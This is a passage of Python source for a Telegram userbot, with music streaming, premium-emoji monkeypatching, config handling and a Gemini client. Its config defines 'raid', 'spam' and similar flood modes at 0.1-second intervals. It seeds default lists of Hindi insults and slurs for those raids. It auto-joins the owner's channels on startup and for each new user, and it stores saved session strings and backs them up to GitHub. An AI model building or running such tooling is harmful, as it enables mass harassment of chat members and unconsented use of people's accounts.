import os
import asyncio
import time
import random
import sys
import re
import json
import gc
import datetime
import shutil
import subprocess
import concurrent.futures
from datetime import timedelta, timezone
import warnings
warnings.filterwarnings("ignore", category=FutureWarning, module="google")

# ── ffmpeg / ffprobe PATH fix (Heroku apt buildpack) ────────────────────────
# Heroku's heroku-buildpack-apt installs packages to /app/.apt/usr/bin but
# only adds that dir to PATH via a .profile.d shell script.  Python worker
# dynos skip .profile.d, so the PATH env-var is never updated and both yt-dlp
# and PyTgCalls can't find ffmpeg/ffprobe.  We patch it here at import-time
# so every downstream library (yt-dlp, PyTgCalls, subprocess calls) gets the
# correct binary automatically.
_FFMPEG_SEARCH_PATHS = [
    "/app/.apt/usr/bin",          # Heroku apt buildpack (primary)
    "/usr/local/bin",
    "/usr/bin",
    "/bin",
]

def _find_binary(name: str) -> str | None:
    for d in _FFMPEG_SEARCH_PATHS:
        p = os.path.join(d, name)
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    return None

_FFMPEG_BIN  = _find_binary("ffmpeg")
_FFPROBE_BIN = _find_binary("ffprobe")

if _FFMPEG_BIN:
    _ffmpeg_dir = os.path.dirname(_FFMPEG_BIN)
    _cur_path   = os.environ.get("PATH", "")
    if _ffmpeg_dir not in _cur_path.split(":"):
        os.environ["PATH"] = _ffmpeg_dir + ":" + _cur_path
    # yt-dlp respects this env-var directly, no extra config needed
    os.environ["FFMPEG_BINARY"] = _FFMPEG_BIN
    if _FFPROBE_BIN:
        os.environ["FFPROBE_BINARY"] = _FFPROBE_BIN
# ─────────────────────────────────────────────────────────────────────────────

GENAI_AVAILABLE = False
_genai_sdk = None
try:
    from google import genai as _genai_sdk
    GENAI_AVAILABLE = True
except ImportError:
    pass

# ══════════════════════════════════════════
# PYROGRAM + PYTGCALLS (Music Engine)
# ══════════════════════════════════════════
PYRO_AVAILABLE = False
PYTGCALLS_AVAILABLE = False
pyro_app = None
pytgcalls_app = None
asstbot_started = False   # set True in main() after successful sign_in
# Per-session Pyrogram clients — each userbot account manages its own music connection
pyro_apps: dict = {}         # {user_id_int: PyroClient}
pytgcalls_apps: dict = {}    # {user_id_int: PyTgCalls}

try:
    from pyrogram import Client as PyroClient
    from pyrogram.errors import (
        SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
        FloodWait as PyroFloodWait, PhoneNumberInvalid, ChatAdminRequired,
        RPCError as PyroRPCError,
    )
    PYRO_AVAILABLE = True
except ImportError:
    pass

try:
    from pytgcalls import PyTgCalls
    from pytgcalls import filters as pytgcalls_filters
    from pytgcalls.types import MediaStream, AudioQuality, VideoQuality
    from pytgcalls.exceptions import NoActiveGroupCall, NotInCallError
    PYTGCALLS_AVAILABLE = True
except ImportError:
    pass

YTDLP_AVAILABLE = False
try:
    import yt_dlp
    YTDLP_AVAILABLE = True
except ImportError:
    pass

try:
    import requests
except ImportError:
    requests = None

# Extra no-cookie/no-login fallback sources (SoundCloud, Audius, Internet
# Archive, Jamendo, direct media URLs, iTunes metadata refine) + a small
# on-disk stream cache and queue-dedupe helper. See music_sources.py.
import music_sources

# GitHub-backed durable persistence — see github_store.py's module
# docstring. No-op unless GITHUB_TOKEN + GITHUB_REPO are set.
import github_store

from telethon import TelegramClient, events, types, errors, Button, utils as tl_utils
from telethon.sessions import StringSession
from telethon.tl.functions.contacts import BlockRequest
from telethon.tl.functions.channels import EditBannedRequest, EditAdminRequest
from telethon.tl.types import ChatBannedRights, ChatAdminRights
from telethon.tl.functions.messages import SendReactionRequest as _SendReactionReq, GetMessagesViewsRequest as _GetMsgViewsReq
from telethon.tl.types import ReactionEmoji as _TLReactionEmoji
from telethon.client.messages import MessageMethods as _TL_MessageMethods
import contextvars

# ══════════════════════════════════════════
# PREMIUM EMOJI ENGINE
# ------------------------------------------
# The self-account this userbot runs on is a
# Telegram Premium account. Whenever it sends
# a message, every normal emoji found in the
# text is automatically upgraded into a real
# Telegram Premium (custom) emoji, picked at
# random from the pool below — a fresh random
# id every single time, never a fixed mapping.
#
# A second, separate pool is used exclusively
# for the text portion of .tagall / .onetag
# broadcasts (the mention tags themselves are
# left untouched, only the emojis inside the
# accompanying tag-line are swapped).
# ══════════════════════════════════════════

# General pool — used for every normal bot message
PREMIUM_EMOJI_IDS = [
    6172738808971268732, 4929483658114368660, 6001569493048891375,
    6303210599639684218, 5999337402840127790, 6073220916324602224,
    5244863909818571734, 6073454283372630712, 6075839983086736035,
    6174884334114182449, 6199293238847740460, 6125399112499075549,
    6136164675659766791, 6124898345082165755, 6303333259610691279,
    6275794758237426356, 6208470235339560785, 6127636064610818291,
    6122730271360946438, 6123129707614441341, 5188451807898131583,
    6172473603330675315, 6172467470117376317, 6172313014503479475,
    6172370910662628916, 6172553768895256106, 6172738808971268732,
    5188385214430209713, 5188221335658064259, 6120953460570460166,
    6120648298849112199, 6123205406413033871, 6120721519451574392,
    14047402874,
]

# Tag pool — used only inside .tagall / .onetag broadcast text
TAG_PREMIUM_EMOJI_IDS = [
    6271317151752133080, 6132149332209570672, 6132085212642809594,
    6154448909784585982, 6168060795016976899, 6208470235339560785,
    6127265108285462970, 6125024672955245388, 6125196652035711334,
    6127214608059996162, 6124917006715066442, 6127153722603607764,
    6125453924871706734, 6073328174542885838, 6127436584854754979,
    6073366185003455324, 6073117703965511893, 6073174912929894433,
    6275794758237426356,
]

# Matches single emoji, emoji+variation-selector, skin-tone modifiers,
# ZWJ emoji sequences (e.g. 🏋️‍♂️, 👰‍♀️), flags, and keycap sequences.
_EMOJI_RE = re.compile(
    "(?:[\U0001F1E6-\U0001F1FF]{2})"
    "|(?:[\U0001F300-\U0001FAFF\u2600-\u27BF\u2190-\u21FF\u2B00-\u2BFF]"
    "[\U0000FE0F\U0001F3FB-\U0001F3FF]?"
    "(?:\u200D[\U0001F300-\U0001FAFF\u2600-\u27BF][\U0000FE0F\U0001F3FB-\U0001F3FF]?)*)"
    "|(?:[0-9#\\*]\U0000FE0F?\u20E3)"
)

# Which emoji pool the current outgoing message should draw from.
# Defaults to the general pool; .tagall/.onetag switch to the tag pool
# for the duration of their broadcast via `use_tag_emoji_pool()`.
_EMOJI_POOL_CTX = contextvars.ContextVar("premium_emoji_pool", default=None)


class use_tag_emoji_pool:
    """Context manager: route emoji conversion through TAG_PREMIUM_EMOJI_IDS."""
    def __enter__(self):
        self._token = _EMOJI_POOL_CTX.set(TAG_PREMIUM_EMOJI_IDS)
        return self

    def __exit__(self, exc_type, exc, tb):
        _EMOJI_POOL_CTX.reset(self._token)
        return False


_PREMIUM_STATUS_CACHE = {}       # id(client) -> (bool, cached_at_monotonic)
_PREMIUM_CACHE_TTL_OK   = 600    # re-check a known-good status every 10 min
_PREMIUM_CACHE_TTL_FAIL = 30     # but retry quickly after a lookup failure,
                                 # so one transient get_me() hiccup at boot
                                 # can't permanently disable premium emojis


async def is_self_premium(client) -> bool:
    """Whether the account this client is logged in as has Telegram Premium."""
    key  = id(client)
    now  = time.monotonic()
    cached = _PREMIUM_STATUS_CACHE.get(key)
    if cached is not None:
        value, ts, ok = cached
        ttl = _PREMIUM_CACHE_TTL_OK if ok else _PREMIUM_CACHE_TTL_FAIL
        if now - ts < ttl:
            return value

    try:
        me = await client.get_me()
        premium = bool(getattr(me, "premium", False))
        _PREMIUM_STATUS_CACHE[key] = (premium, now, True)
        return premium
    except Exception:
        # Lookup failed (e.g. not connected yet) — keep serving the last
        # known value if we have one instead of flipping premium off.
        if cached is not None:
            return cached[0]
        _PREMIUM_STATUS_CACHE[key] = (False, now, False)
        return False


def refresh_self_premium(client, value: bool):
    """Force-set the cached premium status for a client (e.g. right after login)."""
    _PREMIUM_STATUS_CACHE[id(client)] = (bool(value), time.monotonic(), True)


def _codepoint_to_utf16_offsets(text):
    offsets = [0]
    total = 0
    for ch in text:
        total += 2 if ord(ch) > 0xFFFF else 1
        offsets.append(total)
    return offsets


def inject_premium_emojis(text, entities, pool):
    """Overlay a MessageEntityCustomEmoji on top of every plain emoji found in `text`."""
    if not text or not pool:
        return entities
    matches = list(_EMOJI_RE.finditer(text))
    if not matches:
        return entities
    offsets = _codepoint_to_utf16_offsets(text)
    new_entities = list(entities) if entities else []
    for match in matches:
        u16_start = offsets[match.start()]
        u16_len   = offsets[match.end()] - u16_start
        if u16_len <= 0:
            continue
        new_entities.append(types.MessageEntityCustomEmoji(
            offset=u16_start, length=u16_len,
            document_id=random.choice(pool)
        ))
    return new_entities


async def _premiumize_outgoing(client, message, kwargs):
    try:
        if not isinstance(message, str) or not message:
            return message, kwargs
        if not await is_self_premium(client):
            return message, kwargs

        entities = kwargs.get("formatting_entities")
        if entities:
            text = message
            entities = list(entities)
        else:
            parse_mode = kwargs.get("parse_mode", ())
            if parse_mode == ():
                mode_obj = client.parse_mode
            elif not parse_mode:
                mode_obj = None
            else:
                mode_obj = tl_utils.sanitize_parse_mode(parse_mode)
            if mode_obj is None:
                text, entities = message, []
            else:
                text, entities = mode_obj.parse(message)

        if not _EMOJI_RE.search(text):
            return message, kwargs

        pool = _EMOJI_POOL_CTX.get() or PREMIUM_EMOJI_IDS
        entities = inject_premium_emojis(text, entities, pool)

        new_kwargs = dict(kwargs)
        new_kwargs["formatting_entities"] = entities
        new_kwargs["parse_mode"] = None
        return text, new_kwargs
    except Exception:
        return message, kwargs


_ORIG_SEND_MESSAGE = _TL_MessageMethods.send_message
_ORIG_EDIT_MESSAGE  = _TL_MessageMethods.edit_message


async def _premium_send_message(self, entity, message="", **kwargs):
    message, kwargs = await _premiumize_outgoing(self, message, kwargs)
    return await _ORIG_SEND_MESSAGE(self, entity, message, **kwargs)


async def _premium_edit_message(self, entity, message=None, text=None, **kwargs):
    # Telethon internally calls edit_message(entity, msg_id, new_text) with text as
    # the 3rd positional arg — the old 2-param signature crashed with TypeError.
    if isinstance(text, str) and text:
        text, kwargs = await _premiumize_outgoing(self, text, kwargs)
    elif isinstance(message, str) and message:
        message, kwargs = await _premiumize_outgoing(self, message, kwargs)
    return await _ORIG_EDIT_MESSAGE(self, entity, message, text=text, **kwargs)


# Patched once on the class itself, so every TelegramClient instance in this
# file (the main userbot, the assistant music bot, login-flow clients, etc.)
# — and every helper built on top of them (.reply, .respond, Message.edit) —
# automatically gets premium emoji conversion for free.
_TL_MessageMethods.send_message = _premium_send_message
_TL_MessageMethods.edit_message = _premium_edit_message

# ══════════════════════════════════════════
# FILE PATHS — GitHub / Heroku Compatible
# Uses data/ folder for all persistent files
# ══════════════════════════════════════════
BOOT_TIME   = time.monotonic()
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
DATA_DIR    = os.path.join(BASE_DIR, "data")
os.makedirs(DATA_DIR, exist_ok=True)

CHOSEN_DIR   = DATA_DIR
CONFIG_PATH  = os.path.join(DATA_DIR, "config.json")
ABUSE_PATH   = os.path.join(DATA_DIR, "abuse.txt")
OW_PATH      = os.path.join(DATA_DIR, "ow.txt")
TAGALL_PATH  = os.path.join(DATA_DIR, "tagall.txt")
SRAID_PATH   = os.path.join(DATA_DIR, "sraid.txt")
FUN_PATH     = os.path.join(DATA_DIR, "fun.txt")
MUSIC_CACHE  = os.path.join(DATA_DIR, "music_cache")
os.makedirs(MUSIC_CACHE, exist_ok=True)
TRACKS_DIR   = os.path.join(DATA_DIR, "tracks")
os.makedirs(TRACKS_DIR, exist_ok=True)

# Stream cache: replaying a song someone already requested reuses the file
# already on disk instead of re-downloading/re-searching from scratch.
_stream_cache = music_sources.StreamCache(MUSIC_CACHE, logger=lambda tag, msg: bot_logger(tag, msg))

# NOTE: YouTube support (and the cookies.txt workaround it needed for its
# "Sign in to confirm you're not a bot" wall) has been removed entirely.
# The music engine is now 100% cookie-free / login-free — see
# music_sources.py for the full list of sources it uses instead.

# ══════════════════════════════════════════
# 100+ FUN ANIMATIONS GENERATOR
# ══════════════════════════════════════════
def setup_fun_txt():
    if not os.path.exists(FUN_PATH):
        fun_dict = {
            "hack":    ["<blockquote>💻 <b>Initializing...</b></blockquote>",
                        "<blockquote>💻 <b>Bypassing Security...</b></blockquote>",
                        "<blockquote>💻 <b>Accessing Database...</b></blockquote>",
                        "<blockquote>💻 <b>Downloading Data [||||      ]</b></blockquote>",
                        "<blockquote>💻 <b>Downloading Data [||||||||||]</b></blockquote>",
                        "<blockquote>✅ <b>Access Granted! 😈</b></blockquote>"],
            "bomb":    ["💣", "💣...", "💣......", "💣.........", "💥 BOOM!"],
            "moon":    ["🌑", "🌒", "🌓", "🌔", "🌕", "🌖", "🌗", "🌘", "🌑"],
            "clock":   ["🕛", "🕒", "🕕", "🕘", "🕛", "🕒", "🕕", "🕘"],
            "hearts":  ["🤍", "💖", "💗", "💓", "💞", "💕", "💘", "❤️"],
            "pacman":  ["ᗧ", "ᗧ ⚪", "ᗧ  ⚪", "ᗧ   ⚪", "ᗧ    ⚪", "ᗧ     ⚪", "💥"],
            "battery": ["🔋 0%", "🔋 20%", "🔋 40%", "🔋 60%", "🔋 80%", "🔋 100% Fully Charged!"],
            "runner":  ["🏃", "🏃💨", "🏃💨💨", "🏃💨💨💨", "🏆 Finish Line!"],
            "police":  ["🚓", "🚓   🚗", "🚓💨  🚗", "🚓💨💨 🚗💥", "🚨 BUSTED!"],
            "rocket":  ["🚀", "🚀.", "🚀..", "🚀...", "🌍🚀", "🌍 🚀", "🌍  🚀", "🌍   🚀🛸", "💥"],
            "magic":   ["🪄", "🪄✨", "🪄✨🐇", "🪄✨🕊️", "🎩 Ta-da!"],
            "monkey":  ["🙈", "🙉", "🙊", "🐒", "🍌"],
            "weather": ["☀️", "🌤️", "⛅", "🌥️", "☁️", "🌧️", "⛈️", "⚡"],
            "plant":   ["🌱", "🌿", "🪴", "🌳", "🍎"],
            "drink":   ["🥛", "☕", "🍺", "🥂", "🥃", "🥴"],
            "fight":   ["🥷", "🥷 ⚔️", "🥷 ⚔️ 🤺", "🥷 🩸", "☠️"],
            "love":    ["👀", "😳", "🥰", "💍", "👰‍♀️", "🧑‍🍼"],
            "money":   ["🪙", "💵", "💸", "💰", "🤑"],
            "gym":     ["🧍", "🏋️", "🏋️‍♂️", "💪", "🦍"],
            "sleep":   ["🥱", "😴", "💤", "🛌", "🌅"],
        }
        for i in range(1, 26):
            fun_dict[f"prog{i}"]   = [f"Loading {i} [>    ]", f"Loading {i} [>>   ]",
                                       f"Loading {i} [>>>  ]", f"Loading {i} [>>>> ]",
                                       f"Loading {i} [>>>>>] Done!"]
        for i in range(1, 26):
            fun_dict[f"spin{i}"]   = [f"Spinning {i} \\", f"Spinning {i} |",
                                       f"Spinning {i} /",  f"Spinning {i} -"] * 2
        for i in range(1, 26):
            fun_dict[f"bounce{i}"] = [f"Bounce {i} ⚽", f"Bounce {i} 🏀",
                                       f"Bounce {i} 🏈", f"Bounce {i} ⚾", f"Bounce {i} 🎾"]
        for i in range(1, 16):
            fun_dict[f"wave{i}"]   = [f"Wave {i} ▂", f"Wave {i} ▃", f"Wave {i} ▄",
                                       f"Wave {i} ▅", f"Wave {i} ▆", f"Wave {i} ▇", f"Wave {i} █"]
        try:
            with open(FUN_PATH, "w", encoding="utf-8") as f:
                json.dump(fun_dict, f, indent=4)
        except Exception:
            pass

setup_fun_txt()

# ══════════════════════════════════════════
# CREDENTIALS — loaded from environment (Replit Secrets)
# Never hardcode tokens/session strings in source. Set these as secrets:
#   TELEGRAM_API_ID, TELEGRAM_API_HASH, TELEGRAM_BOT_TOKEN,
#   TELEGRAM_PRIMARY_SESSION, TELEGRAM_PYRO_SESSION (optional, for music),
#   TELEGRAM_OWNER_ID, GEMINI_API_KEY (optional)
# Non-secret: TELEGRAM_LOG_CHANNEL_ID (optional)
# ══════════════════════════════════════════
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

_API_ID_RAW  = os.environ.get("TELEGRAM_API_ID", "")
_API_HASH    = os.environ.get("TELEGRAM_API_HASH", "")
_PRIMARY_SES = os.environ.get("TELEGRAM_PRIMARY_SESSION", "")
_BOT_TOKEN   = os.environ.get("TELEGRAM_BOT_TOKEN", "")
_LOG_CHANNEL = os.environ.get("TELEGRAM_LOG_CHANNEL_ID", "0")
_OWNER_ID    = os.environ.get("TELEGRAM_OWNER_ID", "")
_OWNER_UNAME = os.environ.get("TELEGRAM_OWNER_USERNAME", "")
_HELP_BUTTON = os.environ.get("TELEGRAM_HELP_LINK", "")
_GEMINI_KEY  = os.environ.get("GEMINI_API_KEY", "")
_PYRO_SES    = os.environ.get("TELEGRAM_PYRO_SESSION", "")

# Fix base64 padding
_PRIMARY_SES = _PRIMARY_SES.strip()
if not _PRIMARY_SES.endswith("="):
    _pad = len(_PRIMARY_SES) % 4
    if _pad != 0:
        _PRIMARY_SES += "=" * (4 - _pad)

def _abort(msg):
    print(f"\033[91m[CRITICAL] {msg}\033[0m", flush=True)
    sys.exit(1)

if not _API_ID_RAW or not _API_ID_RAW.isdigit():
    _abort("API_ID not set or not numeric.")
if not _API_HASH:
    _abort("API_HASH not set.")
if not _BOT_TOKEN:
    _abort("BOT_TOKEN not set.")
if not _PRIMARY_SES:
    _abort("PRIMARY_SESSION not set.")
if _PRIMARY_SES.startswith("BQ"):
    _abort("PRIMARY_SESSION is a Pyrogram session (starts with 'BQ'). Set a TELETHON string.")

_API_ID    = int(_API_ID_RAW)
_LOG_CID   = int(_LOG_CHANNEL) if _LOG_CHANNEL.lstrip('-').isdigit() else 0
_OWNER_UID = int(_OWNER_ID) if _OWNER_ID.isdigit() else 0

DEFAULT_CONFIG = {
    "API_ID":             _API_ID,
    "API_HASH":           _API_HASH,
    "PRIMARY_SESSION":    _PRIMARY_SES,
    "BOT_TOKEN":          _BOT_TOKEN,
    "LOG_CHANNEL":        _LOG_CID,
    "OWNER_USERNAME":     _OWNER_UNAME,
    "OWNER_ID":           _OWNER_UID,
    "START_MEDIA_PATH":   None,
    "CUSTOM_STARTUP_MSG": "🟢 <b>4ST PRIME CORE ACTIVE</b>\nPerformance: <code>MAX_SPEED</code>",
    "MASTER_SYNC":        False,
    "SUDO_LEVEL_1":       [],
    "SUDO_LEVEL_2":       [],
    "DEFAULT_SPEEDS": {
        "raid": 0.1, "fuck": 0.1, "multi": 0.1, "ow": 0.1,
        "spam": 0.1, "rraid": 0.1, "tagall": 1.5, "onetag": 1.5,
        "ghost": 0.1, "sraid": 0.5,
    },
    "ACTIVE_FONTS": {
        "raid": 0, "fuck": 0, "multi": 0, "ow": 0,
        "spam": 0, "rraid": 0, "tagall": 0, "onetag": 0, "ghost": 0, "sraid": 0,
    },
    "ACTIVE_TYPING": {
        "raid": False, "fuck": False, "multi": False, "ow": False,
        "spam": False, "rraid": False, "tagall": False, "onetag": False,
        "ghost": False, "sraid": False,
    },
    "CUSTOM_CMDS":       {},
    "CMD_ALIASES":       {},   # {user_id_str: {".alias": "existing_cmd"}}
    "MAX_BAN_LIMIT":     300,
    "DM_WARNING_LIMIT":  5,
    "SAVED_STRINGS":     [],
    "USER_MAPS":         {"telethon": {}},
    "HELP_REPORT_LINK":  "https://t.me/+X1UQ5x4szFA3NDc1",
    "BOT_USERS":         [],
    "BOT_GROUPS":        [],   # group/supergroup chat_ids where userbot received a command
    "AI_API_KEY":        _GEMINI_KEY,
    "PYRO_SESSION":      "",
    "PYRO_SESSIONS":     {},   # {user_id_str: pyrogram_session_str} — per-session music
    "MUSIC_MAX_QUALITY": "high",
    "MUSIC_ADMINS":      [],
    "MUSIC_OPEN_CHATS":  [],   # chat_ids where .forall/.song all was run
    "SAFE_MODE":         False, # full flood protection + jitter when ON
    "WARNINGS":          {},   # {str(chat_id): {str(user_id): count}}
    "WARN_LIMIT":        3,    # auto-ban at this count
    # NAME_HISTORY and USERNAME_HISTORY moved to data/tracks/{uid}.json files
    "AUTO_JOIN_LINKS":  [     # channels/groups/bots to join on startup & new user
        "https://t.me/+89KjPAaDPlAwODIx",
        "https://t.me/+X1UQ5x4szFA3NDc1",
        "@Wordseekcheatbot",
        "@ChaTFighT_UboT",
        "https://t.me/ApexAssociation",
        "@WordseeK_Game_BoT",
        "https://t.me/+Mh-zlZNbDME4OTA1",
        "https://t.me/+maO8yZxYtcM0NDY1",
        "https://t.me/FontsxWorld",
        "https://t.me/DigitaL_MajduR",
    ],
}

def load_config():
    # Heroku's filesystem is wiped on every dyno restart, so on a fresh
    # dyno there is no local data/config.json yet even though the bot has
    # existing users. If GitHub backup is configured, pull the last-synced
    # copy down first so BOT_USERS / SAVED_STRINGS / etc. survive restarts.
    if not os.path.exists(CONFIG_PATH) and github_store.is_enabled():
        remote = github_store.fetch_remote_config(logger=lambda tag, msg: print(f"[{tag}] {msg}", flush=True))
        if remote:
            try:
                with open(CONFIG_PATH, "w", encoding="utf-8") as f:
                    json.dump(remote, f, indent=4)
                print("[GITHUB_STORE] Restored config.json from GitHub backup.", flush=True)
            except Exception as e:
                print(f"[GITHUB_STORE_ERR] Could not write restored config: {e}", flush=True)
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
            for key, val in DEFAULT_CONFIG.items():
                if key not in data:
                    data[key] = val
            if not isinstance(data.get("USER_MAPS"), dict):
                data["USER_MAPS"] = {"telethon": {}}
            else:
                if not isinstance(data["USER_MAPS"].get("telethon"), dict):
                    data["USER_MAPS"]["telethon"] = {}
            data.setdefault("DEFAULT_SPEEDS", {}).setdefault("sraid", 0.5)
            data.setdefault("ACTIVE_TYPING",  {}).setdefault("sraid", False)
            data.setdefault("ACTIVE_FONTS",   {}).setdefault("sraid", 0)
            # Bug fix (Master Sync stuck OFF): older config.json copies —
            # especially ones that round-tripped through GitHub Contents API
            # base64/JSON re-encoding, or were hand-edited — could end up
            # storing MASTER_SYNC (and SAFE_MODE) as something other than a
            # real Python bool (e.g. the string "false", which is TRUTHY in
            # Python since it's a non-empty string). `not "false"` evaluates
            # to False, so toggling a corrupted string value could silently
            # "toggle" it right back to an off-looking state every time.
            # Force both flags to real booleans on every load so the ON/OFF
            # toggle logic downstream is never fed a non-bool value.
            data["MASTER_SYNC"] = bool(data.get("MASTER_SYNC", False)) and data.get("MASTER_SYNC") not in (0, "0", "false", "False", "off", "OFF", "")
            data["SAFE_MODE"]   = bool(data.get("SAFE_MODE", False)) and data.get("SAFE_MODE") not in (0, "0", "false", "False", "off", "OFF", "")
            # Always override secrets from hardcoded values
            data["API_ID"]          = _API_ID
            data["API_HASH"]        = _API_HASH
            data["PRIMARY_SESSION"] = _PRIMARY_SES
            data["BOT_TOKEN"]       = _BOT_TOKEN
            data["LOG_CHANNEL"]     = _LOG_CID or data.get("LOG_CHANNEL", 0)
            data["OWNER_ID"]        = _OWNER_UID or data.get("OWNER_ID", 0)
            data["AI_API_KEY"]      = _GEMINI_KEY or data.get("AI_API_KEY", "")
            data["PYRO_SESSION"]    = _PYRO_SES or data.get("PYRO_SESSION", "")
            # Migration: older deployments only ever had one global Pyrogram
            # session (PYRO_SESSION). Copy it into the new per-account
            # PYRO_SESSIONS map (keyed by owner id) the first time we see it,
            # so upgrading doesn't silently drop an existing music login.
            if not isinstance(data.get("PYRO_SESSIONS"), dict):
                data["PYRO_SESSIONS"] = {}
            _owner_key = str(data.get("OWNER_ID", 0))
            if data["PYRO_SESSION"] and _owner_key not in data["PYRO_SESSIONS"]:
                data["PYRO_SESSIONS"][_owner_key] = data["PYRO_SESSION"]
            return data
        except Exception:
            return dict(DEFAULT_CONFIG)
    else:
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            safe = {k: v for k, v in DEFAULT_CONFIG.items()
                    if k not in ("API_HASH", "PRIMARY_SESSION", "BOT_TOKEN", "AI_API_KEY")}
            json.dump(safe, f, indent=4)
        return dict(DEFAULT_CONFIG)

def save_config(c):
    safe = {k: v for k, v in c.items()
            if k not in ("API_HASH", "PRIMARY_SESSION", "BOT_TOKEN", "AI_API_KEY")}
    try:
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(safe, f, indent=4)
    except Exception:
        pass
    # Mirror every save to the GitHub backup (new user joins, new saved
    # session, custom command, warning counts, ...) so the next Heroku
    # restart doesn't lose it. Non-blocking — runs on a background thread.
    github_store.push_config_async(safe, logger=lambda tag, msg: print(f"[{tag}] {msg}", flush=True))

cfg = load_config()
if "USER_MAPS" not in cfg:
    cfg["USER_MAPS"] = {"telethon": {}}
if "CUSTOM_CMDS" not in cfg:
    cfg["CUSTOM_CMDS"] = {}

# ══════════════════════════════════════════
# AI ENGINE
# ══════════════════════════════════════════
AI_API_KEY = cfg.get("AI_API_KEY", "")
_genai_client = (
    _genai_sdk.Client(api_key=AI_API_KEY)
    if (AI_API_KEY and GENAI_AVAILABLE and _genai_sdk) else None
)

_AI_FALLBACK_MODELS = ["gemini-2.5-flash", "gemini-2.0-flash", "gemini-1.5-flash"]

def _ai_generate_sync(prompt: str) -> str:
    if not _genai_client:
        raise RuntimeError("No GEMINI_KEY configured")
    last_err = None
    for model in _AI_FALLBACK_MODELS:
        try:
            response = _genai_client.models.generate_content(model=model, contents=prompt)
            return response.text
        except Exception as e:
            last_err = e
            err_str = str(e)
            if "429" in err_str or "RESOURCE_EXHAUSTED" in err_str or "quota" in err_str.lower():
                continue
            raise
    raise last_err

async def _ai_generate(prompt: str) -> str:
    return await asyncio.to_thread(_ai_generate_sync, prompt)

ai_modes = {}

# ══════════════════════════════════════════
# DEFAULT WORD LISTS
# ══════════════════════════════════════════
DEFAULT_ABUSES = [
    "Tera system hang mc 😋", "Aaja samne saale l@uda",
    "Baap se bakchodi nahi beta 👋", "Ab bol na re mc ..🥺😂",
]
DEFAULT_OWS  = ["aaja", "chal", "bhag", "terii", "maa", "kii", "chvt", "chvtiye", "nikal", "lawde"]
DEFAULT_TAGS = ["Kaha busy ho 🥺", "Aao baatein karein", "GC active kro fast!"]
DEFAULT_SRAID = [
    "Tumhe pata hai, duniya mein 8 planets aur 200+ countries hain, par meri duniya sirf tum ho. 🌍❤️",
    "Aapki aankhein itni gehri hain ki tairna aata ho fir bhi doobne ka mann karta hai. 👀🌊",
    "Kya tum thak nahi jati? Pura din mere dimaag me ghoomti rehti ho! 🏃\u200d♀️🧠",
    "Mujhe lagta tha magic exist nahi karta, phir maine tumhari smile dekh li. 🪄😍",
    "Agar khoobsurti ka koi tax hota, toh tum ab tak umar-qaid me hoti! 🚔💖",
]

def load_words(file_path, fallbacks):
    if os.path.exists(file_path):
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                lines = [line.strip() for line in f if line.strip()]
                return lines if lines else fallbacks
        except Exception:
            return fallbacks
    return fallbacks

# Create default txt files if missing
for _path, _defaults in [
    (ABUSE_PATH, DEFAULT_ABUSES),
    (OW_PATH, DEFAULT_OWS),
    (TAGALL_PATH, DEFAULT_TAGS),
    (SRAID_PATH, DEFAULT_SRAID),
]:
    if not os.path.exists(_path):
        try:
            with open(_path, "w", encoding="utf-8") as _f:
                _f.write("\n".join(_defaults))
        except Exception:
            pass

# ══════════════════════════════════════════
# FONT MAPS
# ══════════════════════════════════════════
FONT_MAPS = {
    1: {"chars": "𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁𝒂𝒃𝒄𝒅𝒆𝒇𝒈𝒉𝒊𝒋𝒌𝒍𝒎𝒏𝒐𝒑𝒒𝒓𝒔𝒕𝒖𝒗𝒘𝒙𝒚𝒛0123456789",
       "orig": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"},
    2: {"chars": "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗",
       "orig": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"},
    3: {"chars": "ΑΒ𝐶DEFGHIJKLMNOPQRSTUVWXYZ𝑎bcdefghijklmnopqrstuvwxyz0123456789",
       "orig": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"},
    4: {"chars": "卂乃匚ᗪ乇千Ꮆ卄丨ﾌҜㄥ爪几口尸Ɋ尺丂ㄒㄩᐯ山乂ㄚ乙卂乃匚ᗪ乇千Ꮆ卄丨ﾌҜㄥ爪几口尸Ɋ尺丂ㄒㄩᐯ山乂ㄚ乙0123456789",
       "orig": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"},
    5: {"chars": "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ０１２３４５６７８９",
       "orig": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"},
}

def apply_font_transformer(text, font_idx):
    if font_idx not in FONT_MAPS:
        return text
    fm    = FONT_MAPS[font_idx]
    orig  = fm["orig"]
    chars = fm["chars"]
    result = []
    in_tag = False
    for ch in text:
        if ch == '<':
            in_tag = True
            result.append(ch)
        elif ch == '>':
            in_tag = False
            result.append(ch)
        elif in_tag:
            # Don't transform characters inside HTML tags (<b>, <i>, etc.)
            result.append(ch)
        else:
            idx = orig.find(ch)
            if idx != -1 and idx < len(chars):
                result.append(chars[idx])
